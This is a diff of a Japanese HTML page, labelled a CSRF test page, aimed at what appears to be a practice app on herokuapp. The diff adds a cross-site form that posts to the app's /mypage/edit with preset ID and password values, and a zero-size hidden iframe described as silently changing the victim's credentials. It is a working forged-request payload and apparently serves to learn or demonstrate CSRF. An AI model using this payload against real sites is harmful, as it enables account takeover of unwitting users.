@@ -1,13 +1,36 @@
-<h1>CSRFテスト（このページはテストページです）</h1>
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>CSRFテスト（このページはテストページです）</title>
+	<style>
+		body {
+			margin: 30px;
+		}
+	</style>
+</head>
+<body>
+	<h1>CSRFテスト（このページはテストページです）</h1>
 
-<h2>ターゲット</h2>
-<li><a href="https://hack-csrf-sample.herokuapp.com/">https://hack-csrf-sample.herokuapp.com/</a></li>
+	<h2>ターゲット</h2>
+	<li><a href="https://hack-csrf-sample.herokuapp.com/">https://hack-csrf-sample.herokuapp.com/</a></li>
 
-<h2>外部へのフォーム</h2>
-<form action="https://hack-csrf-sample.herokuapp.com/mypage/edit" method="PATCH">
-	<input type="text" value="iii@iii.com" name="userId"/>
-	<input type="text" value="testkunkunmama" name="password"/>
-	<button type="submit">submit</button>
-</form>
+	<h2>外部へのフォーム</h2>
+	<form action="https://hack-csrf-sample.herokuapp.com/mypage/edit" method="POST">
+		<p>
+			<label for="userId">ユーザーID</label>
+			<input type="text" name="userId" id="userId" value="hogehogehacker" />
+		</p>
+		<p>
+			<label for="password">パスワード</label>
+			<input type="text" name="password" id="password" value="hogehogehacker" />
+		</p>
+		<button type="submit">submit</button>
+	</form>
 
-<h2>iFrame</h2>
+
+	<h2>自動でId: hogehogehacker, PW: hogehogehacker に変更するiFrame</h2>
+	<iframe src="hack-iframe.html" name="sample" width="0" height="0"></iframe>
+</body>
+</html>
